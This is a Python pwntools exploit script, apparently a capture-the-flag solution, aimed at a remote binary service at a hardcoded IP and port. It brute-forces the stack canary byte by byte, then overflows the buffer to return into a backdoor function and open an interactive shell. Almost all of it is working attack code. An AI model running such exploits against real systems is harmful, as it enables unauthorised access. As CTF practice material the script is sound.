#!/usr/bin/env python3
# Date: 2025-07-04 14:18:30

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.timeout = 5

io = process('./pwn')
io = remote('47.113.197.7', 35007)
elf = ELF('./pwn')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv


backdoor=0x00000000004012db
ret=0x4013f4
canary=b'\x00'
for i in range(7):
    key=1
    while True:

        rl()
        s(b'a'*40+canary+p8(key))
        res = rl(timeout=0.5)
        if b"stack smashing" in res:
            key+=1
            continue
        else:
            canary+=p8(key)
            print(canary)
            break

rl()
# gdb.attach(io)
# stop()
s(b'a'*40)

rl()
s(b'a'*40+canary+p64(0)+p64(ret)+p64(backdoor))


ia()

